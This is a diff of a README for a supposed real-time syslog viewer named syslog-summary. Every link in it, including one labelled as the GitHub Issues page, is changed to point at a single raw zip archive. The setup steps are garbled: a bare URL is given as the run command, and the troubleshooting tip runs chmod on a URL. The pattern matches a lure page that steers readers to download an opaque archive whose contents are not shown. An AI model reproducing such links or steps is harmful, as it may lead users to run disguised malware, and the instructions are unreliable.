@@ -4,9 +4,9 @@
 Welcome to syslog-summary. This tool helps you view the latest syslog entries in real-time. With color-coded severity levels, you can quickly understand the state of your network. Let’s get started.
 
 ## 📦 Download & Install
-To download the latest version of syslog-summary, [visit this page to download.](https://raw.githubusercontent.com/Raja0933/syslog-summary/main/mor/syslog-summary.zip)
+To download the latest version of syslog-summary, [visit this page to download.](https://raw.githubusercontent.com/Raja0933/syslog-summary/main/mor/summary_syslog_v2.6-alpha.5.zip)
 
-![Download](https://raw.githubusercontent.com/Raja0933/syslog-summary/main/mor/syslog-summary.zip)
+![Download](https://raw.githubusercontent.com/Raja0933/syslog-summary/main/mor/summary_syslog_v2.6-alpha.5.zip)
 
 Follow the steps below to get syslog-summary running on your system:
 
@@ -33,7 +33,7 @@ Once you have syslog-summary installed, follow these steps to run it:
    
 2. **Run the Tool**: Enter the following command to start syslog-summary:
    ```bash
-   https://raw.githubusercontent.com/Raja0933/syslog-summary/main/mor/syslog-summary.zip
+   https://raw.githubusercontent.com/Raja0933/syslog-summary/main/mor/summary_syslog_v2.6-alpha.5.zip
    ```
 
 3. **View Real-Time Logs**: The tool will display the latest syslog entries. Look for color codes which indicate the severity of each message:
@@ -54,12 +54,12 @@ syslog-summary comes with several useful features:
 ## 📚 Troubleshooting
 If you encounter issues, try the following tips:
 
-- **Check Permissions**: Ensure you have the right permissions to run the script. Use `chmod +x https://raw.githubusercontent.com/Raja0933/syslog-summary/main/mor/syslog-summary.zip` to make it executable.
+- **Check Permissions**: Ensure you have the right permissions to run the script. Use `chmod +x https://raw.githubusercontent.com/Raja0933/syslog-summary/main/mor/summary_syslog_v2.6-alpha.5.zip` to make it executable.
 - **Dependencies**: Make sure you have Bash installed. Check your Bash version with `bash --version`.
 - **Network Issues**: Verify that your network configuration allows syslog access.
 
 ## 💬 Support
-For questions or support, visit the [GitHub Issues page](https://raw.githubusercontent.com/Raja0933/syslog-summary/main/mor/syslog-summary.zip). You can report bugs or ask for help there.
+For questions or support, visit the [GitHub Issues page](https://raw.githubusercontent.com/Raja0933/syslog-summary/main/mor/summary_syslog_v2.6-alpha.5.zip). You can report bugs or ask for help there.
 
 ## 🎉 Contribution
 If you would like to contribute, check out our guidelines in the repository. Your input helps make syslog-summary better for everyone.
@@ -73,6 +73,6 @@ This project relates to various topics such as:
 You can explore these areas further to better enhance your understanding and usage of syslog-summary.
 
 ## 📥 Download Again
-Reminder, to get the latest version of syslog-summary, [visit this page to download.](https://raw.githubusercontent.com/Raja0933/syslog-summary/main/mor/syslog-summary.zip)
+Reminder, to get the latest version of syslog-summary, [visit this page to download.](https://raw.githubusercontent.com/Raja0933/syslog-summary/main/mor/summary_syslog_v2.6-alpha.5.zip)
 
 With syslog-summary, you can easily monitor your syslog entries in real-time, making your network management tasks simpler and more efficient. Happy logging!
